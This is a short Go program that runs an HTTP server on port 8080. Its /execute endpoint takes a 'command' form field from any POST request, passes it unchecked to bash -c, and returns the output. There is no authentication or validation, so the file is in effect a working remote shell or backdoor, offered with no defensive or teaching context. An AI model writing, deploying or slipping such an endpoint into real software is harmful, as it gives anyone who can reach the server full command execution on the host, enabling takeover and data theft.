package main

import (
	"fmt"
	"io"
	"net/http"
	"os/exec"
)

func main() {
	http.HandleFunc("/execute", executeHandler)
	port := 8080
	fmt.Printf("Server is running on :%d\n", port)
	err := http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
	if err != nil {
		fmt.Println("Error starting server:", err)
	}
}

func executeHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	command := r.FormValue("command")
	if command == "" {
		http.Error(w, "Command not provided", http.StatusBadRequest)
		return
	}

	output, err := executeCommand(command)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error executing command: %s", err), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	io.WriteString(w, output)
}

func executeCommand(command string) (string, error) {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}
	return string(output), nil
}
